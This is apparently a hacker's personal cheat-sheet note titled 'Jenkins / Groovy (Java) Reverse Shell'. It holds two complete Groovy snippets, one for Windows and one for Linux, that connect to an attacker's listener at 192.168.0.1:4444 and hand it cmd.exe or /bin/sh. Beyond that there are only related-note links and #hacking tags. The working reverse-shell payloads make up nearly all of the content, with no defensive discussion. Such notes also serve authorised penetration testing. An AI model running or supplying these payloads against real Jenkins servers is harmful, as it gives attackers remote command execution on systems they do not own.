# Jenkins / Groovy (Java) Reverse Shell

- Windows
```
String host="192.168.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

- Linux
```
String host="192.168.0.1";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

` zet/20221003151247/README.md `

# Related

- [20221003150242](/zet/20221003150242/README.md) identify service
- [20221013222124](/zet/20221013222124/README.md) concept hub for tricks and tips
- [20221014185534](/zet/20221014185534/README.md) kb file named kb/hacking/tricks/jenkins-rev-shell-code.md
- ~/kb/hacking/tricks/jenkins-rev-shell-code.md

Tags:

    #hacking #trick #jenkins #devops
